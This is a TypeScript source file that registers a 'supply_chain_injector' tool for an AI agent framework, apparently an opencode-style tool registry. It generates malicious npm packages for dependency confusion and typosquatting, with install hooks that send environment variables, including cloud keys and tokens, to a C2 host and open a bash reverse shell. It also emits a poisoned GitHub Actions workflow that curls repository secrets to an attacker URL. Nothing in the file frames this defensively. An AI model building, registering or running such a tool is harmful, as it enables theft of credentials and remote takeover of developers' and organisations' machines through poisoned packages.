export * as SupplyChainTool from "./supply-chain-injector"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "supply_chain_injector"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'dependency_confusion' (Scan for internal package names and generate high-version public payloads), 'typosquat' (Generate variations of popular packages with backdoors), 'repo_poison' (Generate malicious PRs or GitHub Actions for compromised repos), 'npm_backdoor' (Create a weaponized npm package structure).",
  }),
  package_name: Schema.String.pipe(Schema.optional).annotate({
    description: "Target package name (e.g., 'internal-auth-lib' or 'react-dom').",
  }),
  c2_url: Schema.String.pipe(Schema.optional).annotate({
    description: "C2 URL to phone home to when the package is installed.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  payload_code: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Supply Chain Poisoning Engine (SolarWinds-tier). Capabilities: Dependency Confusion automation (exploiting internal/public repo misconfigurations), Typosquatting generation, and automated npm/PyPI backdoor structuring. Creates malicious packages that execute system commands upon \`npm install\` or \`pip install\` via postinstall/setup.py scripts.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let payloadCode = ""
              let outputText = ""

              if (action === "dependency_confusion" || action === "npm_backdoor") {
                outputText = `# Dependency Confusion / NPM Backdoor\n\nTarget Package: ${input.package_name || "corporate-internal-lib"}\nC2: ${input.c2_url || "http://evil.com"}`
                payloadCode = `// package.json for Malicious Package
{
  "name": "${input.package_name || "corporate-internal-lib"}",
  "version": "99.9.9",
  "description": "Internal library",
  "main": "index.js",
  "scripts": {
    "preinstall": "node index.js",
    "postinstall": "node index.js"
  },
  "author": "",
  "license": "ISC"
}

// index.js (The Payload)
const os = require('os');
const https = require('https');
const child_process = require('child_process');

const c2 = "${input.c2_url || "https://c2.attacker.com/callback"}";

// Gather intel
const intel = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    dir: __dirname,
    env: process.env
};

// 1. Exfiltrate environment variables (AWS keys, NPM tokens, secrets)
const data = JSON.stringify(intel);
const req = https.request(c2, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
});
req.write(data);
req.end();

// 2. Open reverse shell (if outbound allowed)
// This runs transparently during 'npm install'
try {
    child_process.exec("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
} catch (e) {}
`
              } else if (action === "repo_poison") {
                outputText = `# GitHub Actions Workflow Poisoning`
                payloadCode = `# Malicious .github/workflows/ci.yml
# Triggers on any PR. If the repo allows PRs to execute Actions, this steals repository secrets.
name: CI
on: [pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Steal Secrets
        env:
          AWS_ACCESS_KEY_ID: \$\{{ secrets.AWS_ACCESS_KEY_ID \}\}
          AWS_SECRET_ACCESS_KEY: \$\{{ secrets.AWS_SECRET_ACCESS_KEY \}\}
          GITHUB_TOKEN: \$\{{ secrets.GITHUB_TOKEN \}\}
        run: |
          curl -X POST -d "key=$AWS_ACCESS_KEY_ID&secret=$AWS_SECRET_ACCESS_KEY&token=$GITHUB_TOKEN" ${input.c2_url || "https://attacker.com/exfil"}
`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, payload_code: payloadCode }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Supply chain failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/supply-chain-injector",
  layer,
  deps: [ToolRegistry.node],
})
